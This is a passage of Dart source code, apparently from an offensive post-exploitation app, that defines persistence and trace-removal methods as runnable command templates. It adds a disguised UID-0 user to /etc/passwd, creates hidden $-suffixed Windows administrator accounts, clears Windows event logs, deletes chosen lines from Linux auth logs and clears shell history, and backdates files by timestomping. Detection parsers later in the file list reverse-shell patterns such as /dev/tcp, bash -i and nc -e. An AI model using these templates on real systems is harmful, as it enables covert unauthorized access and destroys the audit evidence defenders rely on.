        hint: 'Login password for the backdoor user',
        defaultValue: 'REPLACE_PASSWORD',
      ),
      PersistParam(
        id: 'salt',
        label: 'Crypt salt (2 chars)',
        hint: 'Random 2-char salt for crypt()',
        defaultValue: 'AA',
      ),
    ],
    warningText:
        'Requires root. Adds a UID-0 user to /etc/passwd. Choose a username that looks like a system daemon. Original passwd is backed up to /etc/passwd.bak.',
    stealth: MethodStealth(
      canDotPrefix: false,
      canTimestampClone: false,
      canHistoryClean: true,
      tsRefFile: '/etc/passwd',
    ),
  ),

  PersistMethod(
    id: 'hidden_account',
    name: 'Hidden Account (\$)',
    description:
        'Create a \$-suffixed local administrator account hidden from `net user` listings.',
    checkCommand: r'net user 2>&1',
    deployTemplate:
        r'net user {username}$ {password} /add && net localgroup administrators {username}$ /add && echo DEPLOY_OK || echo DEPLOY_FAILED',
    verifyTemplate:
        r'net user {username}$ 2>&1',
    rollbackTemplate:
        r'net user {username}$ /delete',
    params: [
      PersistParam(
        id: 'username',
        label: 'Username (auto \$-suffixed)',
        hint: 'e.g. svc_backup',
        defaultValue: 'svc_backup',
      ),
      PersistParam(
        id: 'password',
        label: 'Password',
        hint: 'Password for the hidden account',
        defaultValue: 'REPLACE_PASSWORD',
      ),
    ],
    warningText:
        'Creates a hidden (\$-suffixed) local administrator account. Requires admin. Hidden accounts still appear in `net user` with the \$ and in local account listings.',
    isWindows: true,
    stealth: MethodStealth(canHistoryClean: true),
  ),

  // ── Traces Cleaning ────────────────────────────────────────────────────────

  PersistMethod(
    id: 'clear_eventlog',
    name: 'Clear Windows Event Logs',
    description:
        'Clear the Windows Security, System, and Application event logs (wevtutil).',
    checkCommand:
        r'wevtutil el 2>&1 | findstr /C:"Security" /C:"System" /C:"Application"',
    deployTemplate:
        r'wevtutil cl Security && wevtutil cl System && wevtutil cl Application && echo DEPLOY_OK || echo DEPLOY_FAILED',
    verifyTemplate:
        r'wevtutil gl Security 2>&1 | findstr /C:"enabled"',
    params: const [],
    warningText:
        'Clears the Security, System, and Application event logs. Irreversible — this also erases legitimate audit history. Only run with explicit authorization.',
    isWindows: true,
    stealth: MethodStealth(canHistoryClean: false),
  ),

  PersistMethod(
    id: 'clear_authlog',
    name: 'Clear Linux Auth Logs',
    description:
        'Remove matching lines from auth.log / secure and clear shell history.',
    checkCommand:
        r'ls -la /var/log/auth.log* /var/log/secure* 2>/dev/null || echo "(no auth log found)"',
    deployTemplate:
        r"sed -i '/{pattern}/d' /var/log/auth.log 2>/dev/null; sed -i '/{pattern}/d' /var/log/secure 2>/dev/null; (history -c 2>/dev/null || true); echo 'DEPLOY_OK'",
    verifyTemplate:
        r"grep -qF '{pattern}' /var/log/auth.log /var/log/secure 2>/dev/null && echo 'VERIFY_FAILED:still_present' || echo 'VERIFY_OK:cleared'",
    params: [
      PersistParam(
        id: 'pattern',
        label: 'Pattern to remove',
        hint: 'e.g. your source IP or username',
        defaultValue: 'REPLACE_IP',
      ),
    ],
    warningText:
        'Removes matching lines from auth.log / secure and clears shell history. Irreversible. Use a precise pattern to avoid erasing unrelated log lines.',
    stealth: MethodStealth(canHistoryClean: false),
  ),

  PersistMethod(
    id: 'timestamp_spoof',
    name: 'Timestomping',
    description:
        'Backdate a file to match a reference file\'s modification time (touch -r).',
    checkCommand:
        r'command -v touch >/dev/null 2>&1 && echo "EXPLOIT:OK:touch available" || echo "EXPLOIT:FAIL:touch not found"; stat -c "%y %n" /bin/ls 2>&1 || stat -f "%Sm %N" /bin/ls 2>&1',
    deployTemplate:
        r'touch -r {ref_file} {target_file} && echo DEPLOY_OK || echo DEPLOY_FAILED',
    verifyTemplate:
        r'[ "$(stat -c %Y {ref_file} 2>/dev/null)" = "$(stat -c %Y {target_file} 2>/dev/null)" ] && echo "VERIFY_OK:timestamps_match" || echo "VERIFY_FAILED"',
    params: [
      PersistParam(
        id: 'target_file',
        label: 'Target file',
        hint: 'e.g. /tmp/.kworker',
        defaultValue: '/tmp/.kworker',
        isFilePath: true,
      ),
      PersistParam(
        id: 'ref_file',
        label: 'Reference file',
        hint: 'File whose mtime to clone',
        defaultValue: '/bin/ls',
      ),
    ],
    warningText:
        'Backdates the target file to match the reference file modification time. No rollback — the original timestamp is lost unless recorded.',
    stealth: MethodStealth(
      canDotPrefix: true,
      canTimestampClone: false,
      canHistoryClean: true,
    ),
  ),
];

// ── Group index ───────────────────────────────────────────────────────────────

PersistMethod _m(String id) => allPersistMethods.firstWhere((m) => m.id == id);

final allPersistGroups = <PersistGroup>[
  PersistGroup(
    id: 'scheduled',
    title: 'Scheduled Tasks',
    icon: Icons.schedule,
    color: AppColors.cyan,
    methods: [_m('cron_job'), _m('scheduled_task')],
  ),
  PersistGroup(
    id: 'login',
    title: 'Logon Autostart',
    icon: Icons.login,
    color: AppColors.amber,
    methods: [
      _m('bashrc_backdoor'),
      _m('profile_d'),
      _m('registry_run'),
      _m('startup_folder'),
      _m('winlogon_userinit'),
      _m('logon_script'),
    ],
  ),
  PersistGroup(
    id: 'service',
    title: 'Service Persistence',
    icon: Icons.settings,
    color: AppColors.primary,
    methods: [
      _m('ssh_authorized_keys'),
      _m('systemd_service'),
      _m('initd_script'),
      _m('rc_local'),
      _m('inetd_backdoor'),
      _m('sc_service'),
    ],
  ),
  PersistGroup(
    id: 'priv',
    title: 'Privilege Persistence',
    icon: Icons.admin_panel_settings_outlined,
    color: AppColors.amber,
    methods: [_m('suid_shell'), _m('root_user'), _m('hidden_account')],
  ),
  PersistGroup(
    id: 'traces',
    title: 'Indicator Removal',
    icon: Icons.cleaning_services_outlined,
    color: AppColors.red,
    methods: [
      _m('clear_eventlog'),
      _m('clear_authlog'),
      _m('timestamp_spoof'),
    ],
  ),
];

// ═══════════════════════════════════════════════════════════════════════════════
// Detection parsers — raw output → DetectionResult
// ═══════════════════════════════════════════════════════════════════════════════

DetectionResult parseCron(String raw) {
  if (raw.contains('(no crontab or empty)')) {
    return DetectionResult.clean(raw);
  }
  final lines = raw.split('\n').where((l) {
    final t = l.trim();
    return t.isNotEmpty && !t.startsWith('#');
  }).toList();

  if (lines.isEmpty) return DetectionResult.clean(raw);

  final suspicious = lines.where((l) {
    return l.contains('/dev/tcp') ||
        l.contains('bash -i') ||
        l.contains('nc ') ||
        l.contains('python -c') ||
        l.contains('base64') ||
        RegExp(r'\d+\.\d+\.\d+\.\d+').hasMatch(l);
  }).toList();

  if (suspicious.isNotEmpty) {
    return DetectionResult(
      verdict: DetectionVerdict.suspicious,
      summary: '${suspicious.length} suspicious cron entr${suspicious.length == 1 ? "y" : "ies"} found',
      rawOutput: raw,
      details: suspicious,
      confidence: 0.75,
    );
  }

  return DetectionResult(
    verdict: DetectionVerdict.found,
    summary: '${lines.length} cron entr${lines.length == 1 ? "y" : "ies"} found',
    rawOutput: raw,
    details: lines.take(10).toList(),
    confidence: 0.9,
  );
}

DetectionResult parseBashrc(String raw) {
  if (raw.contains('(no shell profile found)')) {
    return DetectionResult.clean(raw);
  }
  final suspicious = RegExp(
    r'(/dev/tcp|bash -i|nc\s+-[eln]|python.*socket|exec\s+[^s])',
    multiLine: true,
  ).allMatches(raw).map((m) => m.group(0)!).toList();

  if (suspicious.isNotEmpty) {
    return DetectionResult(
      verdict: DetectionVerdict.suspicious,
      summary: '${suspicious.length} suspicious pattern(s) in shell profile',
      rawOutput: raw,
      details: suspicious,
      confidence: 0.7,
    );
  }

  return DetectionResult(
    verdict: DetectionVerdict.found,
    summary: 'Shell profiles found, no obvious backdoor patterns',
    rawOutput: raw,
    confidence: 0.6,
  );
}

DetectionResult parseSshKeys(String raw) {
  if (raw.contains('(no authorized_keys')) {
    return DetectionResult.clean(raw);
  }

  final keyCount = RegExp(r'ssh-(rsa|ed25519|ecdsa|dss)').allMatches(raw).length;
  final lines = raw.split('\n').where((l) {
    final t = l.trim();
    return t.isNotEmpty && !t.startsWith('#') && !t.startsWith('===');
  }).length;

  if (keyCount > 3) {
    return DetectionResult(
      verdict: DetectionVerdict.suspicious,
      summary: '$keyCount SSH keys found — unusually many',
      rawOutput: raw,
      details: ['Keys: $keyCount, Lines: $lines'],
      confidence: 0.65,
    );
  }

  return DetectionResult(
    verdict: DetectionVerdict.found,
    summary: '$keyCount SSH key(s) found',
    rawOutput: raw,
    confidence: 0.9,
  );
}

DetectionResult parseSystemd(String raw) {
  if (raw.contains('(no user systemd services)')) {
    return DetectionResult.clean(raw);
  }
  return DetectionResult(
    verdict: DetectionVerdict.found,
    summary: 'User systemd services present',
    rawOutput: raw,
    confidence: 0.7,
  );
}

DetectionResult parseProfileD(String raw) {
  if (raw.contains('(no profile scripts found)')) {
    return DetectionResult.clean(raw);
  }
  final dotFiles = raw.split('\n').where((l) => l.contains(' .')).toList();
  if (dotFiles.isNotEmpty) {
    return DetectionResult(
      verdict: DetectionVerdict.suspicious,
      summary: '${dotFiles.length} hidden (dot-prefix) script(s) in profile.d',
      rawOutput: raw,
      details: dotFiles,
      confidence: 0.8,
    );
  }
  return DetectionResult(
    verdict: DetectionVerdict.found,
    summary: 'Profile.d scripts present',
    rawOutput: raw,
    confidence: 0.5,
  );
}

DetectionResult parseInitd(String raw) {
  if (raw.contains('(no init.d scripts found)')) {
    return DetectionResult.clean(raw);
  }
  final dotFiles = raw.split('\n').where((l) => l.contains(' .')).toList();
  if (dotFiles.isNotEmpty) {
    return DetectionResult(
      verdict: DetectionVerdict.suspicious,
      summary: '${dotFiles.length} hidden (dot-prefix) init.d script(s)',
      rawOutput: raw,
      details: dotFiles,
      confidence: 0.8,
    );
  }
  return DetectionResult(
    verdict: DetectionVerdict.found,
    summary: 'init.d scripts present',
    rawOutput: raw,
    confidence: 0.5,
  );
}

DetectionResult parseInetd(String raw) {
  if (raw.contains('(no active inetd services)')) {
    return DetectionResult.clean(raw);
  }
  final lines = raw.split('\n').where((l) {
    final t = l.trim();
    return t.isNotEmpty && !t.startsWith('#');
  }).toList();

  if (lines.isEmpty) return DetectionResult.clean(raw);

  final shells = lines.where((l) {
    return l.contains('/bin/sh') || l.contains('/bin/bash');
  }).toList();

  if (shells.isNotEmpty) {
    return DetectionResult(
      verdict: DetectionVerdict.suspicious,
      summary: '${shells.length} inetd shell service(s)',
      rawOutput: raw,
      details: shells,
      confidence: 0.9,
    );
  }

  return DetectionResult(
    verdict: DetectionVerdict.found,
    summary: '${lines.length} inetd service(s) found',
    rawOutput: raw,
    details: lines.take(10).toList(),
    confidence: 0.7,
  );
}

DetectionResult parseSuid(String raw) {
  if (raw.contains('(no SUID backdoor found)') &&
      !raw.startsWith('/')) {
    return DetectionResult.clean(raw);
  }

  final paths = raw.split('\n').where((l) => l.startsWith('/')).toList();
  final nonStandard = paths
      .where((p) => !p.startsWith('/bin/') && !p.startsWith('/usr/bin/'))
      .toList();

  if (nonStandard.isNotEmpty) {
    return DetectionResult(
      verdict: DetectionVerdict.suspicious,
      summary: '${nonStandard.length} SUID shell(s) in non-standard location(s)',
      rawOutput: raw,
      details: nonStandard,
      confidence: 0.9,
    );
  }
  if (paths.isNotEmpty) {
    return DetectionResult(
      verdict: DetectionVerdict.found,
      summary: '${paths.length} SUID shell(s) in standard locations (normal)',
      rawOutput: raw,
      confidence: 0.5,
    );
  }
  return DetectionResult.clean(raw);
}

DetectionResult parseRootUser(String raw) {
  if (raw.contains('(no UID 0 entries found)')) {
    return DetectionResult.clean(raw);
  }

  final uid0Users = raw.split('\n').where((l) => l.contains(':0')).toList();

  if (uid0Users.length > 1) {
    final nonRoot = uid0Users.where((l) => !l.startsWith('root:')).toList();
    return DetectionResult(
      verdict: DetectionVerdict.suspicious,
      summary: '${nonRoot.length} non-root account(s) with UID 0',
      rawOutput: raw,
      details: nonRoot,
      confidence: 0.95,
    );
  }

  return DetectionResult(
    verdict: DetectionVerdict.found,
    summary: 'Only root has UID 0 (normal)',
    rawOutput: raw,
    confidence: 0.9,
  );
}

DetectionResult parseHiddenAccount(String raw) {
  if (raw.startsWith('[Error]')) return DetectionResult.error(raw);
  final hidden = raw.split('\n').where((l) => l.trim().endsWith(r'$')).toList();
  if (hidden.isNotEmpty) {
    return DetectionResult(
      verdict: DetectionVerdict.suspicious,
      summary: '${hidden.length} hidden (\$-suffixed) account(s)',
      rawOutput: raw,
      details: hidden,
      confidence: 0.85,
    );
  }
  return DetectionResult(
    verdict: DetectionVerdict.found,
    summary: 'No hidden accounts in user list',
    rawOutput: raw,
    confidence: 0.6,
  );
}

// ═══════════════════════════════════════════════════════════════════════════════
// Platform filter
// ═══════════════════════════════════════════════════════════════════════════════

List<PersistGroup> filterPersistGroups(bool isWindows) {
  return allPersistGroups.map((g) {
    final applicable = g.methods.where((m) => m.isWindows == isWindows).toList();
    if (applicable.isEmpty) return null;
    return PersistGroup(
      id: g.id,
      title: g.title,
      icon: g.icon,
      color: g.color,
      methods: applicable,
    );
  }).whereType<PersistGroup>().toList();
}
